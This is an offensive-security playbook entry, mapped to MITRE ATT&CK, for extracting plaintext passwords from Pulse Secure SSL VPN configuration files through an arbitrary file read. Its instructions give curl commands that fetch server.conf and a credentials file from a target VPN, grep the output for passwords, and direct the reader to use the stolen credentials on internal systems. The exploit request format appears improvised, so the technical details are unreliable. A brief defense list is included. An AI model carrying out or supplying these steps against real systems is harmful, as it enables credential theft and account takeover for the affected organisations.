---
tags:
  - plaintext-passwords
  - credential-exposure
  - vpn
type: procedure
tools: []
tactics:
  - '[[Credential Access]]'
commands:
  - '[[commands/curl-arbitrary-file-read]]'
verified: false
platforms:
  - Network
  - VPN
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[Unsecured Credentials]]'
updated_at: '2025-12-14T17:26:22.534Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques:
  - '[[Credentials In Files]]'
id: 220a9726-94c9-46ca-aaa3-eb1945b265e1
validated: true
mitre_tactics:
  - '[[Credential Access]]'
mitre_techniques:
  - '[[Unsecured Credentials]]'
---
# Extract-Exposed-Plaintext-Credentials

## Summary

This procedure uses the arbitrary file read capability in Pulse Secure SSL VPN to access files containing unencrypted passwords, directly compromising credentials for internal systems.

## Description

Due to improper storage practices, passwords in Uber's VPN-related configurations were kept in plaintext, making them trivially extractable once file read access is gained. This secondary vulnerability amplifies the impact of the primary flaw, allowing attackers to obtain valid credentials for authentication and privilege escalation. The scenario involves reading config files post-exploitation, with outcomes including full account takeover.

## Requirements

1. Successful arbitrary file read access from prior procedure
2. Knowledge of file paths storing credentials (e.g., /opt/pulse/secure/conf/ files)
3. Text parsing tools for credential extraction

## Defense

Defensive measures and detection strategies:

- Enforce encryption or hashing for all stored credentials (e.g., use bcrypt)
- Conduct regular audits of configuration files for plaintext secrets
- Implement logging and alerting on file access anomalies via SIEM integration

## Objectives

1. Locate and read files with plaintext passwords
2. Extract usable credentials for further attacks
3. Validate credentials against internal systems

## Instructions

### Step 1: Identify Credential Files

**Context**: Use file read to enumerate directories or directly target known config locations for credential storage.

**Command** ([[commands/curl-arbitrary-file-read]]):
```bash
curl "https://vpn.target.com/dana-na/auth/url.xml?param=/opt/pulse/secure/conf/server.conf" -k
```

> This retrieves a sample config file. Scan the output for lines containing 'password=' or similar plaintext entries.

### Step 2: Parse and Use Credentials

**Context**: Save and analyze the file contents to isolate passwords, then test them.

**Command** ([[commands/curl-arbitrary-file-read]]):
```bash
curl "https://vpn.target.com/dana-na/auth/url.xml?param=/path/to/credentials.txt" -k > creds.txt
grep -i "password" creds.txt
```

> The curl fetches the file, saves it, and grep filters for password-related content. Use extracted creds to authenticate to internal services.

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access]]

### Techniques

- [[Unsecured Credentials]]

### Sub-Techniques

- [[Credentials In Files]]

## Commands Used

- [[commands/curl-arbitrary-file-read]]

## Tools Used


## Tags

- plaintext-passwords
- credential-exposure
